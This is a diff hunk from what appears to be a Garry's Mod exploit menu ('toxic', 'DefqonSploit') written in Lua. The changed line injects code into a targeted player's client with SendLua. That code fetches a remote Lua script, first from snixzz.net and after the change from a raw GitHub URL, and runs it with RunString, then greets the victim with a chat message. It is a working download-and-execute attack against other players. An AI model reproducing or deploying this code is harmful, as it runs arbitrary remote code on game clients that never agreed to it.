@@ -7905,7 +7905,7 @@ function toxic.UI()
 
 			toxic.PostLua( [[
 
-				Player(]] .. id .. [[):SendLua('http.Fetch("http://snixzz.net/toxic.pro/toxic.lua",function(body) RunString(body) surface.PlaySound("]] .. snd .. [[") chat.AddText(Color(255,0,0),"[DefqonSploit] ",color_white,"Welcome, run `Defqon` in console") end)')
+				Player(]] .. id .. [[):SendLua('http.Fetch("https://raw.githubusercontent.com/WERooo/defqon/master/DefqonSploit.lua",function(body) RunString(body) surface.PlaySound("]] .. snd .. [[") chat.AddText(Color(255,0,0),"[DefqonSploit] ",color_white,"Welcome, run `Defqon` in console") end)')
 
 			]] )
 
